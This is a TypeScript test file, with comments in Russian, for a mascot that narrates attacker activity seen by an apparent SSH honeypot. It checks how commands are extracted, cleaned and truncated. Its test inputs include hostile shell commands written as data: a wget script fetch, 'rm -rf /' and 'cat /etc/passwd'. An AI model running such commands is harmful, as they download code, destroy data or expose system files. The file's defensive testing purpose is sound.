import { describe, expect, it } from 'vitest';
import { normalize } from '../../mascot/bridge/normalize';
import type { HfEvent } from '../../shared/api/types';
import { mascotSignalFor } from '../../shared/mascot-slot/mascotEvents';
import { attackPayload } from './YumiEvents';
import { YUMI_RULES } from './rules';

type Ev = Pick<HfEvent, 'type' | 'source' | 'service' | 'data'>;
const ev = (type: HfEvent['type'], data: HfEvent['data']): Ev => ({
  type, source: { ip: '203.0.113.9', port: 40112 }, service: { protocol: 'ssh', port: 2222 }, data,
});

/** Сквозной путь без DOM: событие потока → сигнал → payload → реплика Юми. */
function reply(e: Ev): string | null {
  const signal = mascotSignalFor(e);
  if (!signal) return null;
  const rule = YUMI_RULES[signal];
  const out = typeof rule === 'function' ? rule(normalize(attackPayload(signal, e))) : rule;
  return out && typeof out === 'object' && 'say' in out ? String(out.say) : null;
}

describe('Юми: поля событий атак по согласованному формату (specs/events.md)', () => {
  it('команда атакующего — из data.input события session.command', () => {
    expect(attackPayload('attack:command', ev('session.command', { input: 'wget http://x/y.sh' }))).toMatchObject({
      ip: '203.0.113.9', command: 'wget http://x/y.sh', truncated: false,
    });
  });

  it('несогласованное поле data.command не используется', () => {
    expect(attackPayload('attack:command', ev('session.command', { command: 'rm -rf /' })).command).toBe('');
  });

  it('команда не попадает в реплики других событий', () => {
    expect(attackPayload('attack:auth', ev('auth.attempt', { input: 'ls', username: 'root', success: true }))).toMatchObject({
      command: '', truncated: false, username: 'root', success: true, protocol: 'ssh',
    });
  });

  it('нестроковые значения не роняют разбор', () => {
    expect(attackPayload('attack:command', ev('session.command', { input: 42, username: null }))).toMatchObject({ command: '', username: '' });
  });
});

describe('Юми: сквозной путь события до реплики', () => {
  it('многострочный ввод с управляющими последовательностями — одной чистой строкой', () => {
    expect(reply(ev('session.command', { input: 'cat /etc/passwd\n\u001b[31mid\u001b[0m' })))
      .toBe('203.0.113.9 выполняет: cat /etc/passwd id');
  });

  it('длинный ввод обрезается с «…»', () => {
    const say = reply(ev('session.command', { input: 'a'.repeat(200) }))!;
    expect(say).toBe(`203.0.113.9 выполняет: ${'a'.repeat(80)}…`);
  });

  it('data.truncated — «…» и у короткой команды, без удвоения у длинной', () => {
    expect(reply(ev('session.command', { input: 'curl http://x', truncated: true }))).toBe('203.0.113.9 выполняет: curl http://x…');
    expect(reply(ev('session.command', { input: 'b'.repeat(200), truncated: true }))).toBe(`203.0.113.9 выполняет: ${'b'.repeat(80)}…`);
  });

  it('вывод ловушки за команду не принимается', () => {
    expect(reply(ev('session.output', { output: 'root' }))).toBeNull();
  });
});
